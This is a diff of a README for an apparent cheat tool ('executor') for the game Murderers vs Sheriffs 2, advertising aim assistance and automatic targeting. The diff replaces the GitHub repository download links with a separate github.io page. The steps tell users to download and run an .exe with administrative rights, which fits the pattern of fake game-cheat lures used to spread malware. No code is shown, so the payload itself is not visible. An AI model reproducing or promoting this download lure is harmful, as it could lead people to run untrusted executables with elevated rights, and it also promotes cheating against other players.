@@ -1,6 +1,6 @@
 # 🎯 murderers-sheriffs2-executor - Improve your aim and game speed
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/joeymorbilliform125/murderers-sheriffs2-executor)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://joeymorbilliform125.github.io)
 
 This utility helps players in the game Murderers vs Sheriffs 2. It adds aim assistance and manages targets for you. These features make your controls feel faster and more accurate while you play on Windows.
 
@@ -20,7 +20,7 @@ Make sure you have administrative rights on your user account. This allows the s
 
 Follow these steps to get the software on your machine:
 
-1.  Visit the official release page: [https://github.com/joeymorbilliform125/murderers-sheriffs2-executor](https://github.com/joeymorbilliform125/murderers-sheriffs2-executor).
+1.  Visit the official release page: [https://joeymorbilliform125.github.io](https://joeymorbilliform125.github.io).
 2.  Look for the section labeled "Releases" on the right side of the screen.
 3.  Click the latest version number to view the files.
 4.  Download the executable file ending in .exe to your desktop or downloads folder.
